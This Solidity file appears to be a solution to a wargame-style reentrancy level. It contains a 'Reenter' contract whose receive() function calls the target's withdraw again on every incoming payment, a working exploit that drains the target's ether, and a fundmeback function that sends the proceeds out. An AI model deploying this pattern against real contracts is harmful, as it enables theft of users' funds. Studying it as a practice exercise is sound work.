// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel10.sol";

contract Reenter{

    Reentrance level10 = Reentrance(0xA7DE2aFF32f567eA36FC25441cde801879BE5534);
    
    constructor () public payable {}
    function donate(address _to) external payable {
        level10.donate{value: 0.001 ether}(_to);
    }

    function withdraw() external{
        level10.withdraw(0.001 ether);
    }

    function getBalance(address _who) external view returns (uint){
        return address(_who).balance;
    }

    function fundmeback(address payable _to) external payable{
        require(_to.send(address(this).balance), "could not send Ether");
    }
    receive() external payable {
        level10.withdraw(msg.value);
    }

}